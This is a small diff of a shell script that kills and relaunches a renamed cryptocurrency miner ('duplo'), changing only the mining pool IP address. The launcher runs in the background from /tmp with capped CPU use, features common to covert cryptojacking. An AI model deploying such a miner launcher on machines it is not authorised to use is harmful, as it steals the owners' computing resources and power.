@@ -1,4 +1,4 @@
 pkill duplo
 sleep 7
-duplo -o 116.202.31.24:51268 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/duplo/duplo.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=58 --av=1 --variant -1
+duplo -o 95.216.207.56:51268 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/duplo/duplo.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=58 --av=1 --variant -1
 echo -e 'ALL WORKS! tail -f /tmp/duplo/duplo.log'
